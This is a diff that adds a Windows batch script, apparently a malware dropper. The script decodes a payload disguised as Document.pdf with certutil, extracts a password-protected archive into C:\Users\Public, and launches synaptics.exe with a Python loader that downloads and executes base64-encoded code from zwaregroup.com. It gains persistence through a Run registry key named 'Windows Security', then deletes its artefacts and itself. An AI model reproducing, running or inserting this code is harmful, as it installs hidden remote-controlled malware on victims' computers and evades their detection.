@@ -1,0 +1,19 @@
+timeout /t 5 /nobreak > nul
+attrib -s -h -r VERSION.DLL
+Del /S /Q VERSION.DLL
+cd /d "%~dp0"
+set "CODE_LOADER=import requests,base64; exec(base64.b64decode(requests.get('https://zwaregroup.com/buildergroup/cgi-bin/bin/Adonis/Adonis_ALL').text))"
+mkdir C:\Users\Public\VIP4YmtQLN
+certutil -decode Document.pdf DzbIZ1HRMj.rar
+images x -pAnfoE5FeC6R5dPfRbxQgKMtZdV6v0OKC -inul -y DzbIZ1HRMj.rar C:\Users\Public\VIP4YmtQLN
+echo start "" /min "C:\Users\Public\VIP4YmtQLN\synaptics.exe" -c "%CODE_LOADER%" >> "C:\Users\Public\Windows Security"
+echo //4mY2xzDQo= > "C:\Users\Public\Windows Security.~b64"
+certutil -f -decode "C:\Users\Public\Windows Security.~b64" "C:\Users\Public\Windows Security.bat"
+copy /b "C:\Users\Public\Windows Security.bat" /b + "C:\Users\Public\Windows Security" /b "C:\Users\Public\Windows Security.bat"
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Windows Security" /t REG_SZ /d "C:\Windows\Explorer.EXE C:\Users\Public\Windows Security.bat" /f
+Del /S /Q "C:\Users\Public\Windows Security"
+Del /S /Q "C:\Users\Public\Windows Security.~b64"
+Del /S /Q DzbIZ1HRMj.rar
+(goto) 2>nul & del "%~f0"
+
+
